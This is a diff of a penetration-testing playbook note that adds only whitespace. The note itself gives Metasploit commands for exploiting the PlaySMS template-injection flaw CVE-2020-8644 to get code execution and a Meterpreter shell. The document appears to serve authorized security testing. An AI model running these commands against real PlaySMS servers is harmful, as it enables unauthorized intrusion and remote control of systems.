@@ -34,9 +34,15 @@ PlaySMS versions 1.4.3 and earlier are vulnerable to an unauthneticated template
 
 PlaySMS versions 1.4.3 and earlier are vulnerable to an unauthneticated template injection attack which results in code execution (CVE-2020-8644). This vulnerability is due to improper input validation, and seems to exist on all versions of PlaySMS. When a malicious username is submitted, the payload is stored in a TPL template, which is then executed when rendered a second time.
 
+
+
 # Instructions
 
 From a Metasploit session, set and configure the PlaySMS Template Injection module, then run it.
+
+
+
+
 
 **Command** ([[Exploit PlaySMS Template Injection Vulnerability (Metasploit)]]):
 
@@ -47,6 +53,10 @@ set RPORT $_TARGET_PORT
 set TARGETURI $_BASE_URI
 run
 ```
+
+
+
+
 
 Note: This procedure uses Meterpreter shell with default settings. If the exploit fails to create a Meterpreter session, verify the LHOST value is correct and if not, set it manually.
 
@@ -73,3 +83,5 @@ Note: This procedure uses Meterpreter shell with default settings. If the exploi
 - [[exploit]]
 - [[injection]]
 - [[Web Applications]]
+
+
